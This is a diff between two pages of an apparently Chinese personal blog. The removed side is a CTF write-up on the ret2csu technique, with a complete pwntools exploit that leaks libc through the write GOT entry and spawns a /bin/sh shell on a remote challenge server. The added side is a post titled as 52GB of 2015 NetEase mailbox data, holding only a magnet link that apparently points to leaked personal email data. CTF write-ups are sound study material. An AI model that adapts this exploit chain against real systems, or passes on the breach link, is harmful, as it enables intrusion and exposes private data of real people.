@@ -5,7 +5,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	<meta name="description" content="">
 	<meta name="keywords" content="">
-	<title>ret2csu - My Blog</title>
+	<title>页面 - My Blog</title>
     <link rel="alternate" href="" type="application/atom+xml"/>
 	<link rel="shortcut icon" href=""/>
 	
@@ -61,12 +61,11 @@
     </div>
 </header>
 
-        <div class="column-title fadeToTop">
-    <h3><span class="title-info">标签</span> ret2csu</h3>
-</div>
-
-<div class="con-wrap fadeToTop">
+        <div class="con-wrap fadeToTop">
     
+
+        
+
     <section class="article-area">
     
         
@@ -74,8 +73,8 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
-                <a href="/2025/04/20/ret2csu-第一次解答/" title="ret2csu 第一次解答">
-                    ret2csu 第一次解答
+                <a href="/2018/06/23/网易邮箱2015年52gb邮箱数据/" title="网易邮箱2015年52gb邮箱数据">
+                    网易邮箱2015年52gb邮箱数据
                 </a>
             </h2>
         
@@ -83,7 +82,7 @@
         <ul class="article-extra" style="margin-bottom: 20px">
             
             <li class="article-time">
-                2025-04-20
+                2018-06-23
             </li>
             
 
@@ -95,76 +94,7 @@
         </ul>
         <div class="article-description">
             
-            <blockquote>
-<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5949">[SWPUCTF 2024 秋季新生赛]出题人你到底干了什么？</a></p>
-</blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>Linux x64 Linux x86-64传递参数的方式几乎和Windows一样。但是是通过6个寄存器代替4个寄存器来传参(RDI,RSI,RDX,RCX,R8,R9)</p>
-<p>可以用ret2csu来解答</p>
-<blockquote>
-<p>.text:0000000000401226 loc_401226:                             ; CODE XREF: __libc_csu_init+35↑j<br>.text:0000000000401226                 add     rsp, 8<br>.text:000000000040122A                 pop     rbx<br>.text:000000000040122B                 pop     rbp<br>.text:000000000040122C                 pop     r12<br>.text:000000000040122E                 pop     r13<br>.text:0000000000401230                 pop     r14<br>.text:0000000000401232                 pop     r15<br>.text:0000000000401234                 retn</p>
-</blockquote>
-<p>这是需要使用的第一个gadget 避免麻烦直接从40122A开始用</p>
-<p>rbx一般设置0 rbp一般设置1 </p>
-<blockquote>
-<p> loc_401210:                             ; CODE XREF: __libc_csu_init+54↓j<br> .text:0000000000401210                 mov     rdx, r14 第一个参数<br> .text:0000000000401213                 mov     rsi, r13 第二个参数<br> .text:0000000000401216                 mov     edi, r12d 第三个参数<br> .text:0000000000401219                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]<br> .text:000000000040121D                 add     rbx, 1<br> .text:0000000000401221                 cmp     rbp, rbx<br> .text:0000000000401224                 jnz     short loc_401210</p>
-</blockquote>
-<p>如果rbx设置0 也就是直接call[r15]<br>rbp设置1 可以在cmp     rbp, rbx 拿到0<br>从而不循环跳转loc_401210<br>又跳到loc_401226<br>因为add rsp, 8 所以需要多溢出8字节<br>直接填充6*8 + 8 &#x3D; 56字节脏数据<br>然后到ret 接一个main重新溢出<br>然后就可以按照正常的ret2libc打了</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)
-libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;</span>)
-p = remote(<span class="hljs-string">&quot;node6.anna.nssctf.cn&quot;</span>,<span class="hljs-number">26697</span>)
-<span class="hljs-comment">#p = process(&quot;attachment&quot;)</span>
-write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]
-write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]
-gadget_csu_first = <span class="hljs-number">0x40122A</span>
-gadget_csu_second = <span class="hljs-number">0x401210</span>
-main_addr = elf.sym[<span class="hljs-string">&quot;main&quot;</span>]
-payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>
-payload += p64(gadget_csu_first)
-payload += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#pop     rbx set 0</span>
-payload += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#pop     rbp set 1</span>
-payload += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#pop r12 =&gt; rdi first argument</span>
-payload += p64(write_got) <span class="hljs-comment">#pop r13 =&gt; rsi 2 arguc</span>
-payload += p64(<span class="hljs-number">8</span>) <span class="hljs-comment">#pop r14 =&gt; rdx 3</span>
-payload += p64(write_got) <span class="hljs-comment">#pop r15 =&gt; need call 应该是call 到机器码了 而不是实际的地址 所以用got表里面的 plt 里面是 jmp call 机器码肯定报错</span>
-<span class="hljs-comment"># write(1, byte_402008, v3);</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span>
-<span class="hljs-string">.text:0000000000401221                 cmp     rbp, rbx</span>
-<span class="hljs-string">.text:0000000000401224                 jnz     short loc_401210</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-payload += p64(gadget_csu_second)
-<span class="hljs-comment">#设置脏数据  add     rsp, 8  所以多设置8个字节脏数据</span>
-payload += p64(<span class="hljs-number">0xdeadbeef</span>)*<span class="hljs-number">7</span>
-payload += p64(main_addr)
-
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">.plt.sec:0000000000401060 _write          proc near               ; CODE XREF: main+32↓p</span>
-<span class="hljs-string">.plt.sec:0000000000401060 ; __unwind &#123;</span>
-<span class="hljs-string">.plt.sec:0000000000401060                 endbr64</span>
-<span class="hljs-string">.plt.sec:0000000000401064                 bnd jmp cs:off_404018</span>
-<span class="hljs-string">.plt.sec:0000000000401064 _write          endp</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-
-
-<span class="hljs-comment">#attach(p)</span>
-p.send(payload)
-p.recvuntil(<span class="hljs-string">b&quot;!\n&quot;</span>)
-leak_got = u64(p.recv(<span class="hljs-number">8</span>))
-log.success(<span class="hljs-string">&quot;leak write got=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(leak_got))
-libc_base = leak_got - libc.sym[<span class="hljs-string">&quot;write&quot;</span>]
-pop_rdi_ret = <span class="hljs-number">0x401233</span>
-system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
-bin_sh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))
-ret = <span class="hljs-number">0x40101a</span>
-payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> +p64(ret) +p64(pop_rdi_ret) + p64(bin_sh_addr) +p64(system_addr)
-p.send(payload)
-
-p.interactive()</code></pre>
-<p>需要注意的是设置r15 call的时候不能设置plt<br>因为plt里面的是jmp [offset]<br>你call他 就 相当于 call 机器码了 必报错<br>然后payload2 加一个ret 不加不对齐报错</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ret2csu retlibc</p>
+            <p>magnet:?xt&#x3D;urn:btih:066C588A6FE43CE29A07C96E4063357EB18433AB</p>
 
         </div>
         
@@ -176,7 +106,7 @@ p.interactive()</code></pre>
 
         
         <ul class="pagination clear">
-    <span class="page-number current">1</span>
+    <a class="extend prev" rel="prev" href="/page/2/">上一页</a><span class="space">&hellip;</span><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
 </ul>
     </section>
     
@@ -208,7 +138,11 @@ p.interactive()</code></pre>
 
     </div>
 </section>
+
 </div>
+
+
+
 
     
         <footer class="footer">
